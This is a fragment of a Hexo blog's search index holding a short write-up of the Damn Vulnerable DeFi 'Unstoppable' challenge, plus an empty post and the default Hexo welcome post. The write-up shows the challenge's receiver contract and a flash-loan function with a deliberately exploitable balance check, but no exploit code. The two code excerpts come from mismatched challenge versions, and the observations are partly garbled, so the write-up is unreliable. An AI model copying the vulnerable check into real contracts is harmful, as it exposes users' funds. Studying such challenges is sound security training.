class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity 0.8.17;</span><br><span class="line"></span><br><span class="line">import &#123;UnstoppableLender&#125; from &quot;./UnstoppableLender.sol&quot;;</span><br><span class="line">import &#123;IERC20&#125; from &quot;@openzeppelin-contracts/token/ERC20/IERC20.sol&quot;;</span><br><span class="line">import &#123;SafeERC20&#125; from &quot;@openzeppelin-contracts/token/ERC20/utils/SafeERC20.sol&quot;;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * @title ReceiverUnstoppable</span><br><span class="line"> * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)</span><br><span class="line"> */</span><br><span class="line">contract ReceiverUnstoppable &#123;</span><br><span class="line">    using SafeERC20 for IERC20;</span><br><span class="line"></span><br><span class="line">    UnstoppableLender private immutable pool;</span><br><span class="line">    address private immutable owner;</span><br><span class="line"></span><br><span class="line">    error OnlyOwnerCanExecuteFlashLoan();</span><br><span class="line">    error SenderMustBePool();</span><br><span class="line"></span><br><span class="line">    constructor(address poolAddress) &#123;</span><br><span class="line">        pool = UnstoppableLender(poolAddress);</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /// @dev Pool will call this function during the flash loan</span><br><span class="line">    function receiveTokens(address tokenAddress, uint256 amount) external &#123;</span><br><span class="line">        if (msg.sender != address(pool)) revert SenderMustBePool();</span><br><span class="line">        IERC20(tokenAddress).safeTransfer(msg.sender, amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function executeFlashLoan(uint256 amount) external &#123;</span><br><span class="line">        if (msg.sender != owner) revert OnlyOwnerCanExecuteFlashLoan();</span><br><span class="line">        pool.flashLoan(amount);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Observation"><a href="#Observation" class="headerlink" title="Observation"></a>Observation</h2><ul><li>The contract use &gt;0.8.0 which means there is no underflow&#x2F;overflow question</li><li>The contract inherit from Openzepplien’s ReentrancyGuard contract, so we can be sure that reentrancy will not be a problem.</li><li>The <code>constructor</code> is correctly checking that the DVT token is not an empty address</li><li>Our goal is to make the flash loan can;t be support again</li></ul><h2 id="Attack"><a href="#Attack" class="headerlink" title="Attack"></a>Attack</h2><p><code>flashloan()</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">function flashLoan(IERC3156FlashBorrower receiver,address _token,uint256 amount,</span><br><span class="line">bytes calldata data) external returns (bool) &#123;</span><br><span class="line">        if (amount == 0) revert InvalidAmount(0); // fail early</span><br><span class="line">        if (address(asset) != _token) revert UnsupportedCurrency(); // enforce ERC3156 requirement</span><br><span class="line">        uint256 balanceBefore = totalAssets();</span><br><span class="line">        if (convertToShares(totalSupply) != balanceBefore)</span><br><span class="line">            revert InvalidBalance(); // enforce ERC4626 requirement</span><br><span class="line">        uint256 fee = flashFee(_token, amount);</span><br><span class="line">        // transfer tokens out + execute callback on receiver</span><br><span class="line">        ERC20(_token).safeTransfer(address(receiver), amount);</span><br><span class="line">        // callback must return magic value, otherwise assume it failed</span><br><span class="line">        if (</span><br><span class="line">            receiver.onFlashLoan(</span><br><span class="line">                msg.sender,</span><br><span class="line">                address(asset),</span><br><span class="line">                amount,</span><br><span class="line">                fee,</span><br><span class="line">                data</span><br><span class="line">            ) != keccak256(&quot;IERC3156FlashBorrower.onFlashLoan&quot;)</span><br><span class="line">        ) revert CallbackFailed();</span><br><span class="line">        // pull amount + fee from receiver, then pay the fee to the recipient</span><br><span class="line">        ERC20(_token).safeTransferFrom(</span><br><span class="line">            address(receiver),</span><br><span class="line">            address(this),</span><br><span class="line">            amount + fee</span><br><span class="line">        );</span><br><span class="line">        ERC20(_token).safeTransfer(feeRecipient, fee);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="Refer"><a href="#Refer" class="headerlink" title="Refer"></a>Refer</h2><hr><p><a href="https://stermi.xyz/blog/damn-vulnerable-defi-challenge-1-solution-unstoppable">https://stermi.xyz/blog/damn-vulnerable-defi-challenge-1-solution-unstoppable</a><br><a href="https://zach030.xlog.app/damn-vulnerable-defi--Unstoppable">https://zach030.xlog.app/damn-vulnerable-defi--Unstoppable</a><br><a href="https://github.com/WTFAcademy/WTF-Solidity/blob/main/51_ERC4626/readme.md">https://github.com/WTFAcademy/WTF-Solidity/blob/main/51_ERC4626/readme.md</a></p>]]></content>
      
      
      <categories>
          
          <category> DamnVulnerableDefi </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Defi </tag>
            
            <tag> FlashLoan </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Defi-StableCoin</title>
      <link href="/2023/12/28/Defi-StableCoin/"/>
      <url>/2023/12/28/Defi-StableCoin/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2023/12/26/hello-world/"/>
      <url>/2023/12/26/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
